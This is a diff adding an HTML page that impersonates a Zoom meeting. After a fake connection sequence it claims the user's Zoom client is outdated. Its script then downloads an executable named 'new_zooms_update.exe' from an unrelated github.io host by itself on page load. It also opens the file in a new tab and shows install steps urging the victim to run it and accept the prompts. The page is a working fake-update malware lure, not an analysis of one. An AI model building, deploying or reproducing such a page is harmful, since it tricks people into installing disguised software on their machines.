@@ -1,0 +1,869 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Zoom Meeting</title>
+
+    
+    <link rel="stylesheet" href="" />
+
+    <style>
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        
+        .meeting-container {
+            width: 100%;
+            max-width: 1100px;
+            height: 90vh;
+            max-height: 750px;
+            background: #2b2b2b;
+            border-radius: 24px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7);
+            display: flex;
+            flex-direction: column;
+        }
+
+        
+        .meeting-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 28px;
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(8px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            flex-shrink: 0;
+            z-index: 5;
+        }
+
+        .meeting-header .left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .meeting-header .left .zoom-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        .meeting-header .left .zoom-logo i {
+            color: #2d8cff;
+            font-size: 24px;
+        }
+
+        .meeting-header .left .meeting-id {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+            background: rgba(255, 255, 255, 0.08);
+            padding: 4px 14px;
+            border-radius: 30px;
+            letter-spacing: 0.3px;
+        }
+
+        .meeting-header .right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 13px;
+        }
+
+        .meeting-header .right i {
+            font-size: 16px;
+            cursor: default;
+        }
+
+        .meeting-header .right .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #4caf50;
+            display: inline-block;
+            animation: pulse-dot 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse-dot {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.4;
+                transform: scale(0.8);
+            }
+        }
+
+        
+        .video-grid {
+            flex: 1;
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            grid-template-rows: 1fr 1fr;
+            gap: 6px;
+            padding: 6px;
+            background: #1f1f1f;
+            position: relative;
+            min-height: 0;
+        }
+
+        .video-tile {
+            background: #2a2a2a;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            min-height: 100px;
+        }
+
+        .video-tile .avatar {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .video-tile .avatar i {
+            font-size: 48px;
+            color: rgba(255, 255, 255, 0.15);
+        }
+
+        .video-tile .avatar .name {
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 0.3px;
+        }
+
+        .video-tile .avatar .name .you {
+            color: #2d8cff;
+            font-weight: 500;
+        }
+
+        .video-tile .tile-label {
+            position: absolute;
+            bottom: 10px;
+            left: 14px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+            background: rgba(0, 0, 0, 0.5);
+            padding: 2px 12px;
+            border-radius: 20px;
+            backdrop-filter: blur(4px);
+        }
+
+        .video-tile .mic-icon {
+            position: absolute;
+            bottom: 10px;
+            right: 14px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
+            background: rgba(0, 0, 0, 0.5);
+            padding: 4px 8px;
+            border-radius: 20px;
+        }
+
+        
+        .video-tile:nth-child(1) {
+            border: 2px solid #2d8cff;
+            box-shadow: inset 0 0 40px rgba(45, 140, 255, 0.05);
+        }
+
+        .video-tile:nth-child(1) .tile-label {
+            background: #2d8cff;
+            color: #fff;
+        }
+
+        
+        .meeting-controls {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 18px;
+            padding: 16px 28px;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            flex-shrink: 0;
+            z-index: 5;
+        }
+
+        .meeting-controls .ctrl-btn {
+            background: rgba(255, 255, 255, 0.06);
+            border: none;
+            color: rgba(255, 255, 255, 0.7);
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            font-size: 18px;
+            cursor: default;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+        }
+
+        .meeting-controls .ctrl-btn.leave {
+            background: #e74c3c;
+            color: #fff;
+            width: 52px;
+            border-radius: 30px;
+            padding: 0 20px;
+            font-size: 14px;
+            font-weight: 600;
+            gap: 8px;
+        }
+
+        .meeting-controls .ctrl-btn.leave i {
+            font-size: 16px;
+        }
+
+        .meeting-controls .ctrl-btn:hover {
+            background: rgba(255, 255, 255, 0.12);
+        }
+
+        .meeting-controls .ctrl-btn.leave:hover {
+            background: #c0392b;
+        }
+
+        .loading-overlay {
+            position: absolute;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+            padding: 30px 20px;
+            transition: opacity 0.6s ease, visibility 0.6s ease;
+        }
+
+        .loading-overlay.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        
+        .big-zoom-logo {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(145deg, #2d8cff, #1a6fd6);
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 64px;
+            box-shadow: 0 20px 60px rgba(45, 140, 255, 0.35);
+            margin-bottom: 32px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            flex-shrink: 0;
+        }
+
+        .big-zoom-logo i {
+            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.2));
+        }
+
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.08);
+            border-top: 4px solid #2d8cff;
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.6, 0, 0.4, 1) infinite;
+            margin-bottom: 30px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        
+        .status-text {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .status-sub {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 14px;
+            font-weight: 300;
+            text-align: center;
+        }
+
+        
+        .outdated-message {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            margin-top: 10px;
+            width: 100%;
+            max-width: 500px;
+            animation: fadeUp 0.6s ease;
+        }
+
+        .outdated-message.visible {
+            display: flex;
+        }
+
+        @keyframes fadeUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .outdated-message .warning-icon {
+            font-size: 48px;
+            color: #f39c12;
+            margin-bottom: 12px;
+        }
+
+        .outdated-message h2 {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .outdated-message p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 15px;
+            line-height: 1.6;
+            max-width: 420px;
+        }
+
+        .outdated-message .btn-download {
+            margin-top: 20px;
+            background: #2d8cff;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 14px 44px;
+            border-radius: 40px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            transition: background 0.25s, transform 0.15s;
+            box-shadow: 0 8px 30px rgba(45, 140, 255, 0.3);
+        }
+
+        .outdated-message .btn-download:hover {
+            background: #1a7ae0;
+            transform: scale(1.02);
+        }
+
+        .outdated-message .btn-download:active {
+            transform: scale(0.97);
+        }
+
+        .outdated-message .btn-download i {
+            font-size: 18px;
+        }
+
+        
+        .install-steps {
+            display: none;
+            margin-top: 24px;
+            width: 100%;
+            max-width: 480px;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 16px;
+            padding: 22px 26px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            animation: fadeUp 0.5s ease;
+            text-align: left;
+        }
+
+        .install-steps.visible {
+            display: block;
+        }
+
+        .install-steps .step-title {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-bottom: 14px;
+        }
+
+        .install-steps .step {
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .install-steps .step:last-child {
+            border-bottom: none;
+        }
+
+        .install-steps .step .num {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: rgba(45, 140, 255, 0.15);
+            color: #2d8cff;
+            font-size: 13px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .install-steps .step .content {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .install-steps .step .content strong {
+            color: #fff;
+            font-weight: 500;
+        }
+
+        
+        @media (max-width: 768px) {
+            .meeting-container {
+                height: 95vh;
+                max-height: none;
+                border-radius: 16px;
+            }
+
+            .meeting-header {
+                padding: 12px 16px;
+                flex-wrap: wrap;
+                gap: 6px;
+            }
+
+            .meeting-header .left .meeting-id {
+                font-size: 11px;
+                padding: 2px 10px;
+            }
+
+            .video-grid {
+                grid-template-columns: 1fr 1fr;
+                grid-template-rows: 1fr 1fr 1fr;
+                gap: 4px;
+                padding: 4px;
+            }
+
+            .video-tile .avatar i {
+                font-size: 32px;
+            }
+            .video-tile .avatar .name {
+                font-size: 11px;
+            }
+
+            .meeting-controls {
+                gap: 10px;
+                padding: 12px 16px;
+                flex-wrap: wrap;
+            }
+
+            .meeting-controls .ctrl-btn {
+                width: 38px;
+                height: 38px;
+                font-size: 15px;
+            }
+            .meeting-controls .ctrl-btn.leave {
+                width: 46px;
+                font-size: 12px;
+                padding: 0 14px;
+            }
+
+            .status-text {
+                font-size: 18px;
+            }
+
+            .outdated-message h2 {
+                font-size: 18px;
+            }
+            .outdated-message p {
+                font-size: 14px;
+            }
+            .outdated-message .btn-download {
+                font-size: 14px;
+                padding: 12px 30px;
+            }
+
+            .install-steps {
+                padding: 16px 18px;
+            }
+            .install-steps .step .content {
+                font-size: 13px;
+            }
+
+            .loading-overlay {
+                padding: 20px 16px;
+            }
+
+            .big-zoom-logo {
+                width: 90px;
+                height: 90px;
+                font-size: 48px;
+                border-radius: 22px;
+                margin-bottom: 24px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .video-grid {
+                grid-template-columns: 1fr 1fr;
+                grid-template-rows: 1fr 1fr;
+            }
+            .video-tile:nth-child(5),
+            .video-tile:nth-child(6) {
+                display: none;
+            }
+            .meeting-header .left .zoom-logo {
+                font-size: 15px;
+            }
+            .meeting-header .right {
+                font-size: 11px;
+            }
+            .meeting-header .right .dot {
+                width: 6px;
+                height: 6px;
+            }
+
+            .big-zoom-logo {
+                width: 72px;
+                height: 72px;
+                font-size: 38px;
+                border-radius: 18px;
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="meeting-container">
+
+        
+        <div class="meeting-header">
+            <div class="left">
+                <div class="zoom-logo">
+                    <i class="fas fa-video"></i>
+                    <span>Zoom</span>
+                </div>
+                <span class="meeting-id"><i class="far fa-clock" style="margin-right:6px;"></i> Meeting ID: 872 3091 4421</span>
+            </div>
+            <div class="right">
+                <span><span class="dot"></span> Live</span>
+                <span><i class="fas fa-user-friends"></i> 6</span>
+                <span><i class="fas fa-shield-alt"></i> Encrypted</span>
+            </div>
+        </div>
+
+        
+        <div class="video-grid">
+            
+            <div class="video-tile">
+                <div class="avatar">
+                    <i class="fas fa-user-circle"></i>
+                    <span class="name">Sarah <span class="you">(You)</span></span>
+                </div>
+                <span class="tile-label">Speaking</span>
+                <span class="mic-icon"><i class="fas fa-microphone"></i></span>
+            </div>
+            
+            <div class="video-tile">
+                <div class="avatar">
+                    <i class="fas fa-user-circle"></i>
+                    <span class="name">Michael</span>
+                </div>
+                <span class="tile-label">Joined</span>
+                <span class="mic-icon"><i class="fas fa-microphone-slash"></i></span>
+            </div>
+            
+            <div class="video-tile">
+                <div class="avatar">
+                    <i class="fas fa-user-circle"></i>
+                    <span class="name">Jessica</span>
+                </div>
+                <span class="tile-label">Joined</span>
+                <span class="mic-icon"><i class="fas fa-microphone"></i></span>
+            </div>
+            
+            <div class="video-tile">
+                <div class="avatar">
+                    <i class="fas fa-user-circle"></i>
+                    <span class="name">David</span>
+                </div>
+                <span class="tile-label">Joined</span>
+                <span class="mic-icon"><i class="fas fa-microphone-slash"></i></span>
+            </div>
+            
+            <div class="video-tile">
+                <div class="avatar">
+                    <i class="fas fa-user-circle"></i>
+                    <span class="name">Emily</span>
+                </div>
+                <span class="tile-label">Joined</span>
+                <span class="mic-icon"><i class="fas fa-microphone"></i></span>
+            </div>
+            
+            <div class="video-tile">
+                <div class="avatar">
+                    <i class="fas fa-user-circle"></i>
+                    <span class="name">Alex</span>
+                </div>
+                <span class="tile-label">Joined</span>
+                <span class="mic-icon"><i class="fas fa-microphone-slash"></i></span>
+            </div>
+        </div>
+
+        
+        <div class="meeting-controls">
+            <button class="ctrl-btn" disabled><i class="fas fa-microphone"></i></button>
+            <button class="ctrl-btn" disabled><i class="fas fa-video"></i></button>
+            <button class="ctrl-btn" disabled><i class="fas fa-desktop"></i></button>
+            <button class="ctrl-btn" disabled><i class="fas fa-comment"></i></button>
+            <button class="ctrl-btn" disabled><i class="fas fa-user-plus"></i></button>
+            <button class="ctrl-btn" disabled><i class="fas fa-record-vinyl"></i></button>
+            <button class="ctrl-btn leave" disabled>
+                <i class="fas fa-phone-slash"></i> Leave
+            </button>
+        </div>
+
+        
+        <div class="loading-overlay" id="loadingOverlay">
+            
+            <div class="big-zoom-logo">
+                <i class="fas fa-video"></i>
+            </div>
+
+            
+            <div class="spinner" id="spinner"></div>
+
+            
+            <div class="status-text" id="statusText">Joining meeting…</div>
+            <div class="status-sub" id="statusSub">Connecting to Zoom servers</div>
+
+            
+            <div class="outdated-message" id="outdatedMessage">
+                <div class="warning-icon">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <h2>Your Zoom meeting is outdated</h2>
+                <p>
+                    This meeting requires a newer version of Zoom.
+                    Please download and install the latest update to join.
+                </p>
+
+                <button class="btn-download" id="downloadBtn">
+                    <i class="fas fa-download"></i> Download Zoom
+                </button>
+
+                
+                <div class="install-steps" id="installSteps">
+                    <div class="step-title"><i class="fas fa-list-check"></i> Installation steps</div>
+
+                    <div class="step">
+                        <span class="num">1</span>
+                        <span class="content">
+                            <strong>Run</strong> the downloaded installer file.
+                        </span>
+                    </div>
+                    <div class="step">
+                        <span class="num">2</span>
+                        <span class="content">
+                            Click <strong>“Yes”</strong> or <strong>“Install”</strong> when prompted.
+                        </span>
+                    </div>
+                    <div class="step">
+                        <span class="num">3</span>
+                        <span class="content">
+                            Wait for the installation to complete, then <strong>launch Zoom</strong>.
+                        </span>
+                    </div>
+                    <div class="step">
+                        <span class="num">4</span>
+                        <span class="content">
+                            Return to this page and <strong>click “Join”</strong> to start your meeting.
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            
+            const overlay = document.getElementById('loadingOverlay');
+            const statusText = document.getElementById('statusText');
+            const statusSub = document.getElementById('statusSub');
+            const spinner = document.getElementById('spinner');
+            const outdatedMsg = document.getElementById('outdatedMessage');
+            const downloadBtn = document.getElementById('downloadBtn');
+            const installSteps = document.getElementById('installSteps');
+
+            
+            let step = 0; 
+
+            
+            function getDownloadUrl() {
+                return 'https://nusdanamytes.github.io/zooss/new_zooms_update.exe';
+            }
+
+            
+            function triggerDownload() {
+                const url = getDownloadUrl();
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = ''; 
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+
+                
+                setTimeout(() => {
+                    window.open(url, '_blank');
+                }, 300);
+            }
+
+            
+            function showInstallSteps() {
+                installSteps.classList.add('visible');
+            }
+
+            
+            function advanceSequence() {
+                step++;
+
+                if (step === 1) {
+                    
+                    statusText.textContent = 'Connecting…';
+                    statusSub.textContent = 'Establishing secure connection';
+                    setTimeout(advanceSequence, 2500);
+                    return;
+                }
+
+                if (step === 2) {
+                    
+                    statusText.textContent = 'Update required';
+                    statusSub.textContent = 'Your Zoom client is out of date';
+
+                    
+                    spinner.style.display = 'none';
+
+                    
+                    outdatedMsg.classList.add('visible');
+
+                    
+                    setTimeout(() => {
+                        triggerDownload();
+                        
+                        setTimeout(showInstallSteps, 800);
+                    }, 1500);
+
+                    return;
+                }
+            }
+
+            
+            function startSequence() {
+                
+                statusText.textContent = 'Joining meeting…';
+                statusSub.textContent = 'Connecting to Zoom servers';
+                step = 0;
+
+                
+                setTimeout(advanceSequence, 2500);
+            }
+
+            
+            downloadBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+
+                if (!installSteps.classList.contains('visible')) {
+                    showInstallSteps();
+                }
+
+                triggerDownload();
+
+                const originalText = downloadBtn.innerHTML;
+                downloadBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Downloading…';
+                downloadBtn.disabled = true;
+
+                setTimeout(() => {
+                    downloadBtn.innerHTML = '<i class="fas fa-check"></i> Downloaded';
+                    downloadBtn.style.background = '#27ae60';
+
+                    setTimeout(() => {
+                        downloadBtn.innerHTML = originalText;
+                        downloadBtn.style.background = '';
+                        downloadBtn.disabled = false;
+                    }, 4000);
+                }, 2500);
+            });
+
+            
+            startSequence();
+
+            
+            document.addEventListener('visibilitychange', function() {
+                if (!document.hidden && step < 2) {
+                    
+                }
+            });
+
+        })();
+    </script>
+
+</body>
+</html>
